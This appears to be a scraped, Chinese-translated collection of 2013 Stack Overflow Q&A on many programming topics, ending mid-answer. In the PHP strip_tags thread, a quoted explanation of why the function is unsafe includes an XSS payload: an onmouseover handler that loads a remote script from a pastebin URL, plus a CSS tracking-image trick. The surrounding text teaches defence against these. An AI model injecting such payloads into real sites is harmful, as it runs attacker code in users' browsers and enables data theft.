无论如何，按下提交后它将重新加载页面，再次将 x 变量设置为 1。

一种解决方案可能是发送带有发布数据的 x 参数，然后将其递增。

```
<input type="text" name="x" value="${x}" /> <!-- If you're using EL -->

<input type="text" name="x" value="<%=x%>" /> 
```

和

```
<%
    int x = request.getParameter("x");
    if(x == null){
       x = 1;
    }
%> 
```

从视图中分离逻辑我的意思是你应该使用 Servlets，你会在网上找到很多文档:)

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2013-02-27T11:16:34.973

将此代码更改`<%int x=1; %>`为 this `<%!int x=1; %>`。

问题是：您的`x`声明在本地范围内，每次调用 .jsp (jsp_servlet) 时都会重新初始化。

通过使用`<%! ... %>`您`x`可以在全球范围内定义。

# c++ - C++ Builder XE2：在 dll 中初始化数据模块

> ID：15110463
> 
> 赞同：0
> 
> 时间：2013-02-27T11:04:49.813
> 
> 标签：c++, dll, c++builder, vcl, datamodule

我正在尝试创建一个包含 VCL 数据模块的 dll - 想法是各种应用程序都可以加载相同的 dll 并使用相同的数据库代码。

数据模块本身作为应用程序的一部分经过测试可以正常 - 我已将表单复制到我的 dll 项目中。

所以在dll入口点方法中，我需要初始化数据模块：

```
int WINAPI DllEntryPoint(HINSTANCE hinst, unsigned long reason, void* lpReserved)
{
    //if I don't call this, I get an exception on initializing the data module
    CoInitialize(NULL);

    //initialize a standard VCL form; seems to works fine
    //I'm not using Application->CreateForm as I don't want the form to appear straight away
    if(!MyForm) MyForm = new TMyForm(Application);

    //this doesn't work - the thread seems to hang in the TDataModule base constructor?
    //I've also tried Application->CreateForm; same result
    if(!MyDataModule) MyDataModule = new TMyDataModule(Application);

} 
```

我还看到了一些关于在创建表单之前我需要如何调用 Application->Initialize 的信息，但这似乎没有任何区别。

有任何想法吗？

谢谢

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-02-27T23:06:20.427

你真的不应该在你身上做太多的工作`DllEntryPoint()`。`CoInitialize()`无论如何，当然不会打电话。加载时调用它不是 DLL 的责任。在加载 DLL 之前，这是调用应用程序的责任。

您应该：

1.  导出一个附加函数来初始化您的 DLL，然后在加载 DLL 后使用应用程序（在卸载之前取消初始化 DLL 也是如此）

2.  在 DLL 第一次真正需要它们之前，不要创建 TForm/TDataModule。

3.  将您的 TForm/TDataModule 移动到 DLL 中它们自己的工作线程中。在这种情况下，您将调用`CoIniitalize()`.

在所有情况下，不要依赖 DLL 的`Application`对象来管理 TForm/TDataModule 的生命周期。而是在卸载 DLL 之前自行释放它们。

# java - 获取类声明

> ID：15110466
> 
> 赞同：0
> 
> 时间：2013-02-27T11:05:00.043
> 
> 标签：java, eclipse

是否可以通过 AST 获取类声明的全部信息（使用`modifiers`、 `extends`和）？？？`implements`

我想得到这样的结构：

```
[ modifiers ] class ClassName [ extends SuperClassName ] [ implements InterfaceNames ] { 
```

谢谢提供信息！

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-02-27T11:23:00.617

在 Java 中，很难获得价值，但您可以获得以下内容：-

`Class Modifiers`:- 如果您能够使该类的对象成为公共类，否则其他人

`Extends`:- 您必须检查覆盖的方法。

`Implements`:- 你必须检查类中的抽象方法才能知道。否则该类将是 Abstract class
。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-02-27T11:23:49.547

你不需要这样的反思。

使用[java.lang.Class](http://docs.oracle.com/javase/1.5.0/docs/api/java/lang/Class.html) API

`Class clsObj = Class.forName("yourclas");`

方法如，

```
getModifiers();
getSuperClass();
getInterfaces(); 
```

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2013-02-27T12:34:17.203

正如 TheWhiteRabbit 所提到的，您可以从[java.lang.Class](http://docs.oracle.com/javase/7/docs/api/java/lang/Class.html)类开始使用反射，或者您可能正在寻找诸如[antlr](http://www.antlr.org/)之类的代码解析器。请注意，您的问题似乎已在[此处](https://stackoverflow.com/questions/1967987/how-to-generate-ast-from-java-source-code)提出。

# c# - 查询多个数据库 SQL Server

> ID：15110467
> 
> 赞同：0
> 
> 时间：2013-02-27T11:05:01.193
> 
> 标签：c#, .net, sql-server, azure, sqlconnection

我在 Azure SQL Server 上跨多个数据库运行查询时遇到问题。这是我在执行后从查询中返回 DataTable 的函数。该函数将数据库名称作为字符串并将其与要执行的查询一起插入到连接字符串中。

该函数在我运行一次时运行良好，按预期返回填充了返回行的 DataTable，但是当我使用“foreach”语句调用该函数（遍历数据库名称列表）时，出现超时错误或登录失败错误。

对此的任何帮助将不胜感激。

```
 public static DataTable runQuery(String db, String query)
  {

    using (SqlConnection con = new SqlConnection("Data Source=server.database.windows.net;Initial Catalog=" + db + ";User ID=user@server;Password=password"))
    {

        con.Open();

        using (DataTable dt = new DataTable())
        {

            try
            {

                SqlCommand cmd = new SqlCommand(query, con);
                SqlDataAdapter da = new SqlDataAdapter(cmd);

                da.Fill(dt);

                cmd.Dispose();
                da.Dispose();

            }

            catch (SqlException ex)
            {
                MessageBox.Show(ex.Message);
            }

            return dt;
        }

    }
} 
```

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-02-27T11:19:43.503

我认为您应该尝试`System.Threading.Thread.Sleep`在 foreach 块中添加。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-02-27T11:45:18.133

添加`cmd.CommandTimeout = 0`

```
try
            {

                SqlCommand cmd = new SqlCommand(query, con);
                cmd.CommandTimeout = 0;
                SqlDataAdapter da = new SqlDataAdapter(cmd);

                da.Fill(dtt);

                cmd.Dispose();
                da.Dispose();

            } 
```

# opengl - 关于深度纹理中的通道

> ID：15110469
> 
> 赞同：0
> 
> 时间：2013-02-27T11:05:04.737
> 
> 标签：opengl, opengl-3, depth-testing

我已经实现了深度纹理并在 2 个不同的驱动程序上获得了不同的输出。我正在片段着色器中读取纹理（）中的所有通道：

```
“vec4 color = texelFetch(tk_diffuseMap, ivec3(tmp), i);” 
```

在这种情况下，我分别在 A 和 B 上得到一个红色和灰色的图像。如果我读取红色通道并将其复制到所有 4 个通道，我会在 A 上得到一个灰色图像，例如：

```
“vec4 color = vec4(texelFetch(tk_diffuseMap, ivec3(tmp), i).x)”. 
```

哪一个是正确的？ ![在此处输入图像描述](../Images/9be35ab0cde92c597d007c235a27031c.png)

![在此处输入图像描述](../Images/fcd640b1aef19f9c941b2ae78c0ddc47.png)

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2013-02-27T12:17:33.277

哪个是正确的无关紧要，因为您根本不应该查看其他三个频道。这是一个深度纹理；它只有*一个*频道，第一个。那是你应该触摸的唯一一个。即使 OpenGL 定义了其他值是什么，它也只是一些无关紧要的默认值，因为你不在乎。你想要深度，所以不要再看非深度值了。

但是，如果您想要规范答案，您应该从`GL_RED`纹理中获得相同的结果：0 表示绿色和蓝色，1 表示 alpha。

# android - android view.getId() 返回 -1

> ID：15110474
> 
> 赞同：8
> 
> 时间：2013-02-27T11:05:19.237
> 
> 标签：android, view

我需要更改数据表中一系列标题单元格的文本。
为了实现这一点，我需要检索并存储分配给这些单元格的视图 ID，以便以后可以使用它们来识别这些单元格视图。
但是，当我尝试获取刚刚膨胀的单元格视图的 ID 时，它总是返回 -1。

这是我的示例代码：

```
@Override
public View getView(final int row, final int column, View converView, ViewGroup parent) {
    if (converView == null) {
        converView = inflater.inflate(getLayoutResource(row, column), parent, false);
        if (row == -1){
            int viewId = converView.getId();
            setHeaderId(viewId, column+1);

        }  
    }
...     
} 
```

上面代码中的 converView.getId() 返回 -1，尽管视图 id 已经被分配并且在代码调试期间是可见的。例如，我在调试过程中可以看到以下内容： converView= LinearLayout (id= 830042440680)

知道为什么我在上面的代码中得到 -1 (= NO_ID) 吗？

* * *

## 回答 #1

> 赞同：11
> 
> 时间：2013-02-27T11:14:09.010

来自 Android LayoutInflater 文档：

> 从指定的 xml 资源扩充新的视图层次结构。

所以当你打电话

```
converView = inflater.inflate(getLayoutResource(row, column), parent, false); 
```

converView 只是由您的布局充气器创建并且没有 ID。您应该像这样手动设置 ID

```
converView.setId(YOUR_GENERATED_ID); 
```

# markdown - 降价和脚注：最自然的格式缺失？

> ID：15110479
> 
> 赞同：16
> 
> 时间：2013-02-27T11:05:32.163
> 
> 标签：markdown, footnotes

# 到目前为止的 Markdown 和脚注

我指的是[Markdown: Syntax](http://daringfireball.net/projects/markdown/syntax) at daringfireball.net，它似乎是 Markdown 语法的主要来源。

众所周知，Markdown 基于邮件和新闻组中已经存在的格式。在邮件和新闻组中，我经常看到这样的脚注和转发引用：

```
Blah, blah [1] blah, blah.

[1] http://somesite.com/somepage.html#someanchor 
```

令人惊讶的是，这种非常常见的格式并不是主要 Markdown 参考的一部分。它只知道以下内容：

```
Blah, blah [some title][id] blah, blah.

[id]: http://somesite.com/somepage.html#someanchor 
```

而且我从未见过有人在新闻组或邮件列表中自发地使用它，而前者很常见。

我可以找到一个叫做[PHP Markdown Extra](http://michelf.ca/projects/php-markdown/extra/)的东西，它更接近常见的自发用法，但又足够不同：

```
Blah, blah [^id] blah, blah.

[id]: http://somesite.com/somepage.html#someanchor 
```

更接近了，但我仍然从未见过有人在新闻组或邮件中使用它。

# 问题

我想知道为什么这么多常见的用法不是主要降价参考的一部分，甚至不是我所知道的任何变体的一部分。如果有人知道这个原因，我有兴趣知道这个原因。另一方面，如果我只是遗漏了一些东西，比如遗漏了一个非常常用的 Markdown 变体，并且包括在实践中最自然的编写脚注或转发参考的方式（本文介绍的第一个），那么我会想知道它。

* * *

## 回答 #1

> 赞同：8
> 
> 时间：2014-01-24T02:39:33.267

> ...为什么这么多常见的用法不是主要降价参考的一部分，甚至不是我所知道的任何变体的一部分。

看起来其中一些可用[如何使用 Markdown 或 HTML 格式化我的帖子？](https://stackoverflow.com/help/formatting)：

**链接**

```
Here's an inline link to [Google](http://www.google.com/). Here's a
reference-style link to [Google][1]. Here's a very readable link to
[Yahoo!][yahoo].

  [1]: http://www.google.com
  [yahoo]: http://www.yahoo.com/ 
```

**高级链接**

链接可以有一个标题属性，它会在悬停时显示。也可以添加title属性；如果链接本身的描述性不足以告诉用户他们要去哪里，它们会很有帮助。

```
Here's a [poorly-named link](http://www.google.com/ "Google").
Never write "[click here][^2]".
Visit [us][web].

  [^2]: http://www.w3.org/QA/Tips/noClickHere
        (Advice against the phrase "click here")
  [web]: http://programmers.stackexchange.com/ "Programmers Stack Exchange" 
```

* * *

另请参阅[Markdown 脚注？](https://meta.stackexchange.com/questions/5017/markdown-footnotes)在元。该页面提到[了带有脚注的 Markdown](http://rephrase.net/box/word/footnotes/syntax/)。

* * *

## 回答 #2

> 赞同：5
> 
> 时间：2017-12-12T00:47:59.247

有一些 Markdown 变体或“风味”可以实现脚注（除了你提到的[Php Markdown Extra](https://michelf.ca/projects/php-markdown/extra/#footnotes)）。我知道的是[Pandoc 的 Markdown](https://pandoc.org/MANUAL.html#footnotes)、[R Markdown](http://rmarkdown.rstudio.com/lesson-8.html)、[ScholarlyMarkdown](http://scholarlymarkdown.com/)和[MultiMarkdown](http://fletcherpenney.net/multimarkdown/features/)。

我相信脚注在所有这些变体中都是这样工作的：

> 这是一些带脚注的文本。[^] 和另一个。[^]
> 
> [^]：这是第一个脚注。
> [^]：这是第二个脚注。

或内联：

> 这是一些带脚注的文本。^[这是第一个脚注。]另一个^[这是第二个脚注。]

他们都应该以这种方式呈现：

> 这是一些带脚注的文本。¹还有一个。²
> 
> * * *
> 
> 1.  这是第一个脚注。↩</li>
> 2.  这是第二个脚注。↩</li>

您也可以将链接添加到脚注，例如：

> 这是一些带有脚注和链接的文本。[^这里是一个在末尾带有链接的脚注示例。[链接]( [http://stackoverflow.com)]](http://stackoverflow.com)])

应该像这样呈现：

> 这是一些带脚注的文本。¹
> 
> * * *
> 
> 1.  这是一个脚注示例，末尾有一个链接。[链接](http://stackoverflow.com)↩</li>

顺便说一句，如果您使用*Atom*或*VSCode*等编辑器，您可能需要添加扩展[Markdown Preview Enhanced](https://github.com/shd101wyy/markdown-preview-enhanced/issues/35)。顾名思义，它允许在您键入时预览呈现的文本（它支持[使用 Pandoc 进行预览和导出](https://shd101wyy.github.io/markdown-preview-enhanced/#/pandoc)）。

Pandoc 关于此事的文档：[https ://pandoc.org/MANUAL.html#footnotes](https://pandoc.org/MANUAL.html#footnotes)

# python - 正则表达式不匹配但似乎是正确的

> ID：15110480
> 
> 赞同：0
> 
> 时间：2013-02-27T11:05:32.723
> 
> 标签：python, regex, pattern-matching, python-3.3

我有一个非常奇怪的问题：

在多个在线服务中使用相同的正则表达式匹配，但在我的本地 python 3.3 实例中没有。

```
re.search("ajaxHandler\('(?P<fp>[A-Z0-9]+)",rawdata).group("fp") 
```

原始数据在哪里

```
<select name="F4542661421192HPAUS" onchange="liftAjax.lift_ajaxHandler('F4542661421185WLRZY=' + encodeURIComponent(this.value), null, null, null)">[... blabla ...]</select> 
```

知道出了什么问题吗？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-02-27T11:22:41.170

你能对你的问题更精确一点吗？我也无法重现此错误：

```
rawdata = """<select name="F4542661421192HPAUS" onchange="liftAjax.lift_ajaxHandler('F4542661421185WLRZY=' + encodeURIComponent(this.value), null, null, null)">[... blabla ...]</select>"""

print(re.search("ajaxHandler\('(?P<fp>[A-Z0-9]+)",rawdata).group("fp"))

Output: F4542661421185WLRZY 
```

也许您的原始数据类型出了问题？没有 """ 我得到一个非类型错误，因为 ' 和 " 没有 \" 不工作，虽然这不应该是你的问题？

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-02-27T11:09:08.170

我无法重现这个：

```
Python 3.3.0 (v3.3.0:bd8afb90ebf2, Sep 29 2012, 10:57:17) [MSC v.1600 64 bit (AM
D64)] on win32
Type "help", "copyright", "credits" or "license" for more information.
>>> import re
>>> rawdata="""<select name="F4542661421192HPAUS" onchange="liftAjax.lift_ajaxHandler('F4542661421185WLRZY=' + encodeURIComponent(this.value), null, null, null)">[... blabla ...]</select>"""
>>> re.search("ajaxHandler\('(?P<fp>[A-Z0-9]+)",rawdata).group("fp")
'F4542661421185WLRZY' 
```

# mongodb - 如何仅通过 ObjectID 在日期之间查询 mongodb？

> ID：15110481
> 
> 赞同：1
> 
> 时间：2013-02-27T11:05:38.363
> 
> 标签：mongodb, date, timestamp

我的收藏中没有任何日期属性，我如何查询这样的内容：

```
db.myCol.find(  {
               "DateOf(_id)" : 
                              {"$gt": sometimestamp }
                }) 
```

我尝试了很多东西，但没有任何效果，我该如何查询？

我只有这个属性：

```
{ "_id" : ObjectId( "512cd2a0e4b0e3f4bfb06011" ),
  "username" : "test",
  "device_id" : "353918053821035",
  "phone_type" : "GSM",
  "new" : false } 
```

# javascript - javascript：如何在另一个 div 的“开始”中附加 div

> ID：15110484
> 
> 赞同：1
> 
> 时间：2013-02-27T11:05:43.797
> 
> 标签：javascript, jquery, html, dom

我有一个 div，我想在其中添加另一个 div。但是，通过使用`appendChild()`它总是在容器元素的末尾插入 DOM 元素。但我想将它插入到容器的*开头*`div`。
如何做到这一点？

```
var newDiv= document.createElement('div');
newDiv.innerHTML = "<input type='text'/>";
var item = document.getElementById('containerDivId');
item.appendChild(newDiv);` 
```

* * *

## 回答 #1

> 赞同：7
> 
> 时间：2013-02-27T11:09:20.073

[`prepend()`](http://api.jquery.com/prepend/)是你需要的。。

> 将参数指定的内容插入到匹配元素集中每个元素的开头。

```
 item.prepend(newDiv); 
```

* * *

## 回答 #2

> 赞同：3
> 
> 时间：2013-03-07T13:27:24.617

> 使用 'item.insertBefore(newDiv, item.firstChild);'

* * *

## 回答 #3

> 赞同：3
> 
> 时间：2013-02-27T11:08:46.547

由于您已包含`jquery`标签...您可以使用`prepend()`方法。

或者你可以使用纯 JS `insertBefore`：

```
item.insertBefore(newDiv, item.firstChild); 
```

* * *

## 回答 #4

> 赞同：1
> 
> 时间：2013-02-27T11:11:09.717

您可以在父元素上使用 prepend() 首先添加子元素。

[http://api.jquery.com/prepend/](http://api.jquery.com/prepend/)

我没有时间测试它，但我认为这会奏效。

```
var newDiv= document.createElement('div');
    newDiv.innerHTML = "<input type='text'/>";
var item = document.getElementById('containerDivId');
    item.prepend(newDiv); 
```

* * *

## 回答 #5

> 赞同：1
> 
> 时间：2013-02-27T11:09:01.817

您可以在 jQuery 中使用 prepend 函数。例如，

```
$(item).prepend(newDiv); 
```

* * *

## 回答 #6

> 赞同：1
> 
> 时间：2013-02-27T11:10:08.393

我想你会找到[insertBefore](http://www.w3.org/TR/DOM-Level-3-Core/core.html#ID-952280727)。

```
parentElem.insertBefore(insertedElem, parentElem.firstChild); 
```

# javascript - 如果表单字段的值小于变量，则显示带有信息的警报

> ID：15110487
> 
> 赞同：1
> 
> 时间：2013-02-27T11:05:57.667
> 
> 标签：javascript, jquery

如何做这样的事情：如果这个表单字段的值： `$('#id_erinnerung_am')`

是 < `enddate`-> 显示`alert("Wrong");`

Java脚本代码：

```
$(document).ready(function(){
    $('#id_laufzeit_bis').datepicker().on('changeDate', recalculate_deadline);
    $('#id_kuendigungsfrist').change(recalculate_deadline);
    $('#id_kuendigungsfrist_type').change(recalculate_deadline);

    $('#id_kuendigung_moeglichbis').change(check_reminder_date);
    $('#id_erinnerung_am').datepicker('hide').on(check_reminder_date);

}); 
```

完整代码：[http ://tnij.com/u50dt](http://tnij.com/u50dt)

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-02-27T11:11:16.503

```
var id_erinnerung_am = $('#id_erinnerung_am').val();
if (id_erinnerung_am < enddate) {
  alert("Wrong");
} 
```

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2013-02-27T11:12:14.000

您已经将 的值提取到一个名为`#id_erinnerung_am`的变量中。并且也是一个类型变量（取决于方法的作用......你的代码中没有方法！那么你为什么不像代码中的任何地方一样比较它们呢？`date``reminder_date``enddate``date``moment()``moment()`

```
if(reminder_date < enddate) {
   alert('Wrong');
} 
```

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2013-02-27T11:14:38.103

缺少信息，但我从您的代码中猜测如下：

```
$('#id_erinnerung_am').datepicker().on('changeDate', function(date){
    if (date < endDate) alert('Wrong');
}); 
```

# php - PHP“strip_tags”接受除脚本之外的所有内容

> ID：15110489
> 
> 赞同：2
> 
> 时间：2013-02-27T11:06:15.350
> 
> 标签：php, html, tags, strip-tags

我在发布或保存该页面之前创建一个页面预览。我目前遇到的，忘记`<h1> <h2> <h3> etc`在允许列表中添加标签，但我后来添加了它们。

我想允许除标签之外的所有 HTML 标签`<script>`，到目前为止我想出了这个列表：

```
public static function tags() {
    return '<p><a><hr><br><table><thead><tbody><tr><td><th><tfoot><span><div><ul><ol><li><img>' .
        '<canvas><video><object><embed><audio><frame><iframe><label><option><select><option>' .
        '<input><textarea><button><form><param><pre><code><small><em><b><u><i><strong><article>' .
        '<aside><bdi><details><summary><figure><figcaption><footer><header><hgroup><mark><meter>' .
        '<nav><progress><ruby><rt><rp><section><time><wbr><track><source><datalist><output><keygen>' .
        '<h1><h2><h3><h4><h5><h6><h7><h8><h9>';
} 
```

所以我像这样使用这个静态方法：

```
$model->content = strip_tags($_POST['contents'], HTML5Custom::tags()); 
```

**我错过了那里的任何标签吗？**

我主要关注 HTML5 规范中的 AVAILABLE 标签，所有在 HTML5 中不推荐使用的 HTML4（及更低版本）标签都不在列表中。

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2013-02-27T11:11:42.913

在这种情况下，黑名单比白名单更容易，否则你将不得不不断地重新访问这个脚本并更新它。

此外，`strip_tags()`使 HTML 安全是不可靠的，仍然可以在属性中注入 javascript，例如`onmouseover="alert('hax');`它会`strip_tags()`很好地过去。

我的 HTML 过滤/清理的首选库是[HTML Purifier](http://htmlpurifier.org/)。

* * *

## 回答 #2

> 赞同：3
> 
> 时间：2013-03-01T08:18:42.140

请不要使用 strip_tags，它不安全且不可靠 - 请阅读以下关于 strip_tags 的讨论，了解您应该使用什么：

[reddit.com 上的 Strip_tags 讨论](http://www.reddit.com/r/PHP/comments/nj5t0/what_everyone_should_know_about_strip_tags/)

:: Reddit 帖子详情 ::

strip_tags 是常用的首选函数之一，用于使网页上的用户输入安全显示。但与它听起来的用途相反，strip_tags 从来都不是用于此目的的正确函数，它有很多问题。原因如下：

1.  它可以吃掉合法的文本。它变成“这表明 x<y”。进入“这表明x”，除非它得到一个结束'>'，否则它将继续吃掉评论中的其余行。（例如，它阻止人们讨论 HTML。）
2.  它不会阻止键入的 HTML 实体。人们可以（并且确实）利用它绕过单词过滤器和垃圾邮件过滤器。
3.  使用第二个参数来允许一些标签是 100% 危险的。它一开始是无辜的：有人想在用户评论中允许简单的格式，并做了这样的事情：

每个人都应该知道的关于 strip_tags()

strip_tags 是常用的首选函数之一，用于使网页上的用户输入安全显示。但与它听起来的用途相反，strip_tags 从来都不是用于此目的的正确函数，它有很多问题。原因如下：

*   它可以吃掉合法的文本。它变成“这表明 x<y”。进入“这表明x”，除非它得到一个结束'>'，否则它将继续吃掉评论中的其余行。（例如，它阻止人们讨论 HTML。）

*   它不会阻止键入的 HTML 实体。人们可以（并且确实）利用它绕过单词过滤器和垃圾邮件过滤器。

*   使用第二个参数来允许一些标签是 100% 危险的。它一开始是无辜的：有人想在用户评论中允许简单的格式，并做了这样的事情：

    $message = strip_tags($message, '');

但是标签上的属性不会被删除。所以我可以到你的网站发表这样的评论：

```
<b style="color:red;font-size:100pt;text-decoration:blink">hello</b> 
```

突然间，我可以使用任何我想要的格式。或者我可以这样做：

```
<b style="background:url(http://someserver/transparent.gif);font-weight:normal">hello</b> 
```

使用它，我可以在他们或您不知情的情况下跟踪浏览您网站的用户。

或者如果我特别邪恶，我可以这样做：

```
<b onmouseover="s=document.createElement('script');s.src='http://pastebin.com/raw.php?i=j1Vhq2aJ';document.getElementsByTagName('head')[0].appendChild(s)">hello</b> 
```

使用它，我可以将我自己的脚本注入您的网站，由某人的光标移动到我的评论上触发。这样的脚本会以页面的全部权限在用户的浏览器中运行，因此非常危险。它可以窃取或删除私人用户数据。它可以更改页面的任何部分，例如显示虚假消息或震撼图像。它可能会利用您网站的声誉来诱骗用户下载恶意软件。通过提交查看该评论的用户的新评论，一条评论甚至可以迅速传播到整个网站，病毒式传播。

你不能夸大使用第二个参数的危险。如果有人足够关心，它可能会被利用来造成彻底的破坏。

即使对于已知的安全文本，第二个参数也不能正常工作。使用 like`strip_tags('text in which we want line breaks<br/>but no formatting', '<br>')`仍然会删除中断，因为它将“/”视为标记名称的一部分。

如果您只是想阻止用户提交的输入中的 HTML 和格式设置，以便在网页上显示与输入完全相同的文本，那么正确的函数是 htmlspecialchars。如果要显示多行，请使用 nl2br ，否则文本将显示在一行上。（++Edit：你应该知道你使用的是什么字符集（如果你不知道，目标是在任何地方使用 UTF-8，因为它正在成为一种网络标准）。如果你使用的是奇怪的不兼容 ASCII 的字符集字符集，您必须将其指定为 htmlspecialchars 的第二个参数才能正常工作。）

当您想要允许格式化时，有适当的预先设计的库来允许安全使用各种语法，包括 HTML、Markdown、BBCode 和 Wikitext。

因为当您想要允许格式化时，您应该使用为此设计的适当库。Markdown（在 Reddit 上使用）是一种用户友好的格式化语法，但正如下面 flyfirefox 解释的那样，它允许 HTML 并且本身并不安全。（它是格式化程序而不是消毒剂）。使用 HTML Purifier 之类的消毒剂可以完全安全地使用 HTML 和/或 Markdown 进行格式化，它可以完成 strip_tags 应该做的事情。BBCode 是另一种选择。

如果您觉得有必要制作自己的格式化程序，即使是一个简单的格式化程序，请查看现有的实现以了解它们的作用，因为在使它们可靠和安全方面涉及大量的微妙之处。

使用 strip_tags 的唯一合适时间是删除应该存在的 HTML，现在您正在转换为非 HTML 格式。例如，如果您有一些格式化为 HTML 的内容，现在您想将其写入纯文本文件，那么使用 strip_tags，然后使用 htmlspecialchars_decode 或 html_entity_decode 即可。（在这种情况下，strip_tags 不会有删除合法文本的缺陷，因为当文本首先被制作成 HTML 时，应该已经作为实体正确地转义了。）

通常，strip_tags 只是错误的功能。永远不要使用它。如果你这样做了，绝对不要使用第二个参数，因为迟早有人会滥用它。

# c# - 使用asp.net查找一周中的星期一日期

> ID：15110496
> 
> 赞同：1
> 
> 时间：2013-02-27T11:06:29.720
> 
> 标签：c#, asp.net, .net, datetime

我需要找到本周星期一的日期。

例如，本周星期一是 25 号，所以我需要的日期是：25/02/2013

当我们滚动到下周时，它需要计算：03/03/2013。

我试图搜索，但我无法为 asp.net 找到它。

* * *

## 回答 #1

> 赞同：5
> 
> 时间：2013-02-27T11:12:05.600

```
DateTime mondayDate = DateTime
                          .Today
                          .AddDays(((int)(DateTime.Today.DayOfWeek) * -1) + 1); 
```

所以今天`{27/02/2013 12:00:00 AM}`它会给`{25/02/2013 12:00:00 AM}`

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2013-02-27T11:18:26.533

C#中的用法：

```
dt.AddDays(1 - (dt.DayOfWeek == DayOfWeek.Sunday ? 7 : (int)dt.DayOfWeek)); 
```

在 VB.NET 中的用法：

```
dt.AddDays(1 - If(dt.DayOfWeek = DayOfWeek.Sunday, 7, dt.DayOfWeek)) 
```

参考：[VB.NET 中的日期时间问题](https://stackoverflow.com/a/1706608/468718)

# android - AsyncHttpClient 身份验证失败

> ID：15110497
> 
> 赞同：2
> 
> 时间：2013-02-27T11:06:38.683
> 
> 标签：android, authentication, android-async-http

我试图从网站获得身份验证。我正在使用`AsyncHttpClient`. 这是我正在尝试的代码。

这是我的代码，

```
public class LoginActivity extends Activity {

    String tag = "LoginActivity";
    Button requestBtn;
    AsyncHttpClient httpClient = new AsyncHttpClient();

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_login);

        requestBtn = (Button) findViewById(R.id.upload_file);

        PersistentCookieStore myCookieStore = new PersistentCookieStore(this);
        httpClient.setCookieStore(myCookieStore);

        httpClient.setBasicAuth(ApplicationConstants.userName,
                ApplicationConstants.password, new AuthScope(
                        "http://*.*.*.*:8080/someUrl", 8080,
                        AuthScope.ANY_REALM));

        requestBtn.setOnClickListener(new OnClickListener() {

            @Override
            public void onClick(View v) {
      httpClient.get("http://*.*.*.*:8080/someurl",new AsyncHttpResponseHandler() {

                @Override
                public void onSuccess(String response) {
                System.out.println(response);
                Log.d("Sucessful upload","Onsucess" + response);
                }

                @Override
                public void onFailure(Throwable arg0,String arg1) {

                Log.d("LoginActivity",arg0.toString());
                arg0.printStackTrace();
                super.onFailure(arg0, arg1);
                }
            });
        }

    }
    });
}
} 
```

当我点击按钮时出现异常。它说身份验证失败异常Logcat：

```
02-27 16:02:42.930: D/LoginActivity(8869): org.apache.http.client.HttpResponseException: Unauthorized
02-27 16:02:42.930: W/System.err(8869): org.apache.http.client.HttpResponseException: Unauthorized
02-27 16:02:42.930: W/System.err(8869):     at com.loopj.android.http.AsyncHttpResponseHandler.sendResponseMessage(AsyncHttpResponseHandler.java:235)
02-27 16:02:42.930: W/System.err(8869):     at com.loopj.android.http.AsyncHttpRequest.makeRequest(AsyncHttpRequest.java:79)
02-27 16:02:42.930: W/System.err(8869):     at com.loopj.android.http.AsyncHttpRequest.makeRequestWithRetries(AsyncHttpRequest.java:95)
02-27 16:02:42.930: W/System.err(8869):     at com.loopj.android.http.AsyncHttpRequest.run(AsyncHttpRequest.java:57)
02-27 16:02:42.930: W/System.err(8869):     at java.util.concurrent.Executors$RunnableAdapter.call(Executors.java:442)
02-27 16:02:42.930: W/System.err(8869):     at java.util.concurrent.FutureTask$Sync.innerRun(FutureTask.java:305)
02-27 16:02:42.930: W/System.err(8869):     at java.util.concurrent.FutureTask.run(FutureTask.java:137)
02-27 16:02:42.940: W/System.err(8869):     at java.util.concurrent.ThreadPoolExecutor.runWorker(ThreadPoolExecutor.java:1076)
02-27 16:02:42.940: W/System.err(8869):     at java.util.concurrent.ThreadPoolExecutor$Worker.run(ThreadPoolExecutor.java:569)
02-27 16:02:42.940: W/System.err(8869):     at java.lang.Thread.run(Thread.java:856) 
```

我做错了什么？我使用的网址是正确的。

* * *

## 回答 #1

> 赞同：12
> 
> 时间：2013-12-13T03:50:29.113

我想出了另一个解决方案，因为我遇到了中间代理问题，不喜欢使用上述建议的解决方案以及`setBasicAuth(username, password)`AsyncHttpClient 的默认（错误）实现如何构建授权标头。

所以我自己添加了标头，自己进行了BASE64用户名/密码编码，但是使用`addHeader()`从父客户端实现继承的方法。

现在可以了。

```
asyncHttpClient.addHeader(
  "Authorization",
    "Basic " + Base64.encodeToString(
      (username+":"+password).getBytes(),Base64.NO_WRAP)
); 
```

我希望这对某人有所帮助。

* * *

## 回答 #2

> 赞同：5
> 
> 时间：2013-02-27T11:44:25.577

From [Basic Authentication with Android](http://dlinsin.blogspot.in/2009/08/http-basic-authentication-with-android.html):

Android is shipping with Apache's HttpClient 4.0 Beta2, which has a pitfall, when it comes to Basic Authentication.

When you search for HttpClient and Basic Authentication, Google will most definitely send you to the official documentation of HttpClient 3.x, which shows you, how to do Basic Authentication in a [preemptive way](http://hc.apache.org/httpclient-3.x/authentication.html#Preemptive_Authentication). That means, sending the client's credentials with every request, instead of waiting for a 401 Unauthorized response and only then sending the credentials. That's probably what you want to in the first place, because it saves your client a request.

```
HttpClient client = new HttpClient();
client.getParams().setAuthenticationPreemptive(true);
Credentials defaultcreds = new UsernamePasswordCredentials("username", "password");
client.getState().setCredentials(new AuthScope("myhost", 80, AuthScope.ANY_REALM), defaultcreds); 
```

This sample code won't compile with HttpClient version 4\. The method called setAuthenticationPreemptive is missing. The problem is, if you omit this very method call, the code still works, but the authentication is not preemptive. We missed this little detail and only noticed after a while, that **every request was preceded by a 401** Unauthorized request/response cycle. That doubled the amount of requests we served.

Now check the implementation of AsyncHttpClient:

```
private final DefaultHttpClient httpClient;
public void setBasicAuth( String user, String pass, AuthScope scope){
